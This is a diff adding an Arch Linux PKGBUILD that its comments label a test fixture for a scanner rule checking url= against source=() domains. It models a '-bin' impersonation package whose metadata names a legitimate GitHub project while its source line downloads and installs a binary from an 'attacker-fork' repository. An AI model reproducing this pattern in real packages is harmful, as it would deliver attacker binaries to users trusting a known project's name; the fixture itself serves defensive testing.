@@ -1,0 +1,18 @@
+# Maintainer: Example <example@domain.tld>
+# Fixture: tests AG083 (url= vs source=() domain cross-check).
+# url= says we're the "legit-project" GitHub org, but source=() pulls from a
+# different org. Classic -bin impersonation.
+pkgname=legit-project-bin
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Pretends to be legit, downloads from attacker's fork"
+arch=('x86_64')
+url="https://github.com/legit-project/legit-project"
+license=('MIT')
+depends=('glibc')
+source=("https://github.com/attacker-fork/legit-project/releases/download/v${pkgver}/binary.tar.gz")
+sha256sums=('a1b2c3d4e5f6071829384756abcdef0123456789abcdef0123456789abcdef01')
+
+package() {
+    install -Dm0755 binary "$pkgdir/usr/bin/legit-project"
+}
